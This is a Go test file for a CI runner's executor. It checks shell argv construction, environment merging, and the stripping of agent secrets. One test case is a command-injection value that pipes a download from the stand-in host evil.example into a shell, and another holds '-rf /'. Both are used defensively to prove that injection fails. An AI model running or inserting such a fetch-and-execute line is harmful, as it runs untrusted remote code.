package native

import (
	"reflect"
	"slices"
	"testing"
)

// INV-3 in one assertion. `run` is the third argv element, whole. If this ever
// becomes a concatenation, a job whose script contains a quote reaches the
// shell as syntax rather than as text, and the invariant the whole design rests
// on is gone.
func TestStepArgv_RunIsASingleElement(t *testing.T) {
	tests := map[string]string{
		"plain":               "make build",
		"quotes":              `echo "hello world"`,
		"single quotes":       `echo 'it'\''s fine'`,
		"semicolons":          "cd src; make; cd ..",
		"newlines":            "set -e\nmake build\nmake test",
		"substitution":        "echo $(git rev-parse HEAD)",
		"backticks":           "echo `date`",
		"leading dash":        "-rf /",
		"empty":               "",
		"trailing backslash":  `echo hi \`,
		"injection lookalike": `x"; curl evil.example | sh; echo "`,
	}

	for name, run := range tests {
		t.Run(name, func(t *testing.T) {
			argv := StepArgv("bash", run)
			want := []string{"bash", "-lc", run}
			if !reflect.DeepEqual(argv, want) {
				t.Fatalf("StepArgv = %#v, want %#v", argv, want)
			}
			if len(argv) != 3 {
				t.Errorf("argv has %d elements; run must never be split or joined", len(argv))
			}
		})
	}
}

// §13.3 requires a *login* shell so that Homebrew, rbenv and nvm are on PATH.
// `-c` would be a silent regression: everything a repository's own scripts do
// keeps working, and only the operator's installed toolchain disappears.
func TestStepArgv_IsALoginShell(t *testing.T) {
	argv := StepArgv("", "make")
	if argv[0] != DefaultShell {
		t.Errorf("empty shell resolved to %q, want %q", argv[0], DefaultShell)
	}
	if argv[1] != "-lc" {
		t.Errorf("flag is %q, want -lc; without -l the login environment is missing (§13.3)", argv[1])
	}
	if got := StepArgv("/bin/sh", "make"); got[0] != "/bin/sh" {
		t.Errorf("shell = %q, want /bin/sh", got[0])
	}
}

func TestMergeEnv_Precedence(t *testing.T) {
	spec := map[string]string{"A": "spec", "B": "spec", "C": "spec"}
	carried := map[string]string{"B": "carried", "C": "carried"}
	step := map[string]string{"C": "step"}

	got := mergeEnv(spec, carried, step)
	want := map[string]string{"A": "spec", "B": "carried", "C": "step"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("mergeEnv = %v, want %v", got, want)
	}
}

// A key that cannot be rendered as KEY=value would corrupt every variable after
// it in the block, so it is dropped rather than passed on.
func TestMergeEnv_DropsUnusableKeys(t *testing.T) {
	got := mergeEnv(map[string]string{
		"GOOD":   "1",
		"":       "empty name",
		"A=B":    "embedded equals",
		"A\x00B": "embedded NUL",
	})
	if len(got) != 1 || got["GOOD"] != "1" {
		t.Errorf("mergeEnv = %v, want only GOOD=1", got)
	}
}

func TestBuildEnviron_RunEnvironmentOverridesTheAgents(t *testing.T) {
	base := []string{"HOME=/Users/runner", "PATH=/usr/bin", "TERM=xterm"}
	got := buildEnviron(base, map[string]string{"PATH": "/opt/homebrew/bin", "CI": "true"})

	want := []string{"HOME=/Users/runner", "TERM=xterm", "CI=true", "PATH=/opt/homebrew/bin"}
	if !slices.Equal(got, want) {
		t.Errorf("buildEnviron = %v, want %v", got, want)
	}
}

// The agent's own LATEM_SECRET_* holds credentials for repositories this run
// has nothing to do with (§15). Inheriting the host environment is what makes
// this executor work; inheriting that part of it would hand every job every
// secret on the machine.
func TestBuildEnviron_DropsTheAgentsLatemNamespace(t *testing.T) {
	base := []string{
		"HOME=/Users/runner",
		"LATEM_SECRET_MATCH_PASSWORD=hunter2",
		"LATEM_CONFIG_DIR=/Users/runner/.latem",
		"LATEM_ENV=/stale/path",
	}
	got := buildEnviron(base, map[string]string{"LATEM_ENV": "/tmp/latem-env-r1/env"})

	want := []string{"HOME=/Users/runner", "LATEM_ENV=/tmp/latem-env-r1/env"}
	if !slices.Equal(got, want) {
		t.Fatalf("buildEnviron = %v, want %v", got, want)
	}
	for _, kv := range got {
		if kv == "LATEM_SECRET_MATCH_PASSWORD=hunter2" {
			t.Error("a secret from the agent's own environment reached the step")
		}
	}
}

// Two identical runs must produce identical environments, or nothing about a
// step is reproducible and no test can assert on one.
func TestBuildEnviron_IsSorted(t *testing.T) {
	got := buildEnviron(nil, map[string]string{"Z": "1", "A": "2", "M": "3"})
	if !slices.Equal(got, []string{"A=2", "M=3", "Z=1"}) {
		t.Errorf("buildEnviron = %v, want sorted", got)
	}
}

func TestBuildEnviron_SkipsMalformedBaseEntries(t *testing.T) {
	got := buildEnviron([]string{"HOME=/h", "NOTANASSIGNMENT"}, nil)
	if !slices.Equal(got, []string{"HOME=/h"}) {
		t.Errorf("buildEnviron = %v, want only HOME", got)
	}
}
